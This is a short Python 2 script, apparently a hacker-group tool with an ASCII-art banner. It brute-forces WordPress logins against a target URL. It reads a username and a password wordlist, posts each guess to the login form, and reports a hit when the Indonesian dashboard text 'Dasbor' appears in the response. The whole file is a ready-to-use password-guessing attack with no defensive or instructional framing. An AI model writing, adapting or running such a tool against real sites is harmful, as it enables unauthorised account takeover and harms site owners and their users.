import os
import requests
import time

logo = """
\033[32;1m
        ___          _                          
       / __\___ _ __| |__   ___ _ __ _   _ ___  
      / /  / _ \ '__| '_ \ / _ \ '__| | | / __| 
     / /__|  __/ |  | |_) |  __/ |  | |_| \__ \ 
     \____/\___|_|  |_.__/ \___|_|   \__,_|___/ 
\033[33;1m         WpBf t0olS p0w3reD SecurityXploitcrew\033[37;1m
"""
print logo
kondisi = "Dasbor"

url = raw_input("target : ")
log = raw_input("username : ")
pwd = raw_input("wordlist : ")
pwd = open(pwd,"r").readlines()

jumlah = 1
for o in pwd:
    pw = o.strip()
    form = {"log":log, "pwd":pw, "submit":"wp-submit"}
    http = requests.post(url, data=form)
    k = http.content

    if kondisi in k:
       print "\033[37;1m============\033[32;1m[\033[33;1m",jumlah,"\033[32;1m]\033[37;1m========="
       print "\033[37;1msucses : \033[32;1m",pw
       break
    else:
       print "\033[32;1m[\033[37;1m",jumlah,"\033[32;1m] \033[371mnone : \033[31;1m",pw
       jumlah +=1